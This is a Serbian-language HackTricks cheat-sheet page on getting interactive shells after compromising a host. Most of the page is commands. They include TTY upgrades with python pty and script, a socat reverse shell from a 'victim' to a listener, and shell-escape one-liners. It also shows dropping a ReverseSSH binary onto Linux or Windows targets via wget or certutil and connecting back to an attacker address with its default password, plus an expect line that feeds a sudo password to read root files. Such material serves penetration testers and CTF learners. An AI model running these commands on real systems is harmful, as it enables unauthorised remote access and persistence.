# Potpuni TTY-jevi

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Potpuni TTY

Imajte na umu da shell koji postavite u promenljivu `SHELL` **mora** biti **naveden unutar** _**/etc/shells**_ ili `Vrednost za SHELL promenljivu nije pronađena u /etc/shells fajlu. Ovaj incident je prijavljen`. Takođe, imajte na umu da sledeći isečci rade samo u bash-u. Ako koristite zsh, pređite na bash pre dobijanja shella pokretanjem `bash`.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
Možete dobiti **broj** **redova** i **kolona** izvršavanjem **`stty -a`**
{% endhint %}

#### skripta

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Pokretanje ljuski**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

Praktičan način za **interaktivni pristup ljusci**, kao i za **prenos fajlova** i **prosleđivanje portova**, je da se ispusti statički povezan ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na cilj.

U nastavku je primer za `x86` sa upx-kompresovanim binarnim fajlovima. Za druge binarne fajlove, proverite [stranicu sa izdanjima](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Pripremite lokalno za hvatanje zahteva za prosleđivanje porta ssh:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) Linux cilj:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Ciljani Windows 10 (za ranije verzije, proverite [readme projekta](https://github.com/Fahrj/reverse-ssh#features)):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
* Ako je zahtev za preusmeravanje porta ReverseSSH uspeo, sada biste trebali moći da se prijavite sa podrazumevanom lozinkom `letmeinbrudipls` u kontekstu korisnika koji pokreće `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Bez TTY-a

Ako iz nekog razloga ne možete dobiti pun TTY, i dalje možete interagovati sa programima koji očekuju korisnički unos. U sledećem primeru, lozinka se prosleđuje `sudo` kako bi pročitao fajl:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{% hint style="success" %}
Učite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
